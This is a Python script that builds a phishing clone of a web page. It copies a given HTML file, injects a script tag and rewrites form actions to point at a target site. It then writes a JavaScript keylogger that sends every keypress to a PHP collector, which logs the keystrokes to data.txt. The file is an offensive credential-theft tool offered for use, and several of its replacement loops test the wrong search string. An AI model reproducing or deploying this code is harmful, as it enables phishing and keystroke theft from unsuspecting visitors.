import os , sys , fileinput
###You can change the User Agent here###
UserA="""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"""
S10 = '\033[91m'#yellow
S11 = '\033[94m'#clearblue
S12 = '\033[93m'#pink

def draw():
    print(""" (                         )           """)
    print(""" )\ )   )               ( /(           """)
    print("""(()/(( /(    )    )     )\()) (  (     """)
    print(""" /(_))\())( /(   (    |((_)\ ))\ )\ )  """)
    print("""(_))((_)\ )(_))  )\  '|_ ((_)((_|()/(  """)
    print("""/ __| |(_|(_)_ _((_)) | |/ (_))  )(_)) """)
    print("""\__ \ / // _` | '  \()  ' </ -_)| || | """)
    print("""|___/_\_\\__,_|_|_|_|  _|\_\___| \_, | """)
    print("""                                 |__/  """+S11)

def clear(numlines=100):
  print(S10)
  if os.name == "posix":
    print('\n' * numlines)
    os.system('clear')
    draw()
  elif os.name in ("nt", "dos", "ce"):
    print('\n' * numlines)
    os.system('CLS')
    draw()
  else:
    print('\n' * numlines)
    draw()

clear()
target =input(S12+'Target Page > '+S10)
flu=input(S12+'Enter the .html file >  '+S10)
fle = "Phish/"+flu
clear()
print('\n\nCreating Phish directory\n\n'+S10+'Run 2 time if is the first time\n'+S11)
os.system('cp '+flu+' '+fle)
TxS= """</head>"""
TxR= """<script src="java.js"></script></head>"""
TpF =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS in line :
        print(S10+'\nMatch Found!!!!! </head>\n')
        TpF.write(line.replace(TxS,TxR))
TpF.close()
TxS1= """</HEAD>"""
TxR1= """<script src="java.js"></script></HEAD>"""
TpF =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS in line :
        print(S10+'\nMatch Found!!!!! </HEAD>\n')
        TpF.write(line.replace(TxS1,TxR1))
TpF.close()
TxS2= """action='/"""
TxR2= ("""action='"""+target+"""/""")
TpF =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS in line :
        print(S10+"\nMatch Found!!!!! action='/\n")
        TpF.write(line.replace(TxS2,TxR2))
TpF.close()
TxS3= 'action="/'
TxR3= ('action="'+target+'/')
TpF =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS in line :
        print(S10+'\nMatch Found!!!!! action="/\n')
        TpF.write(line.replace(TxS3,TxR3))
TpF.close()
w = open("Phish/java.js", "w")
w.write("""
var buffer = [];
var attacker = 'get.php?c='
document.onkeypress = function(e) {
    buffer.push(e.key);
}
window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 10);
""")
w.close()
f = open("Phish/get.php", "w")
f.write("""
<?php
if(!empty($_GET['c'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
""")
f.close()
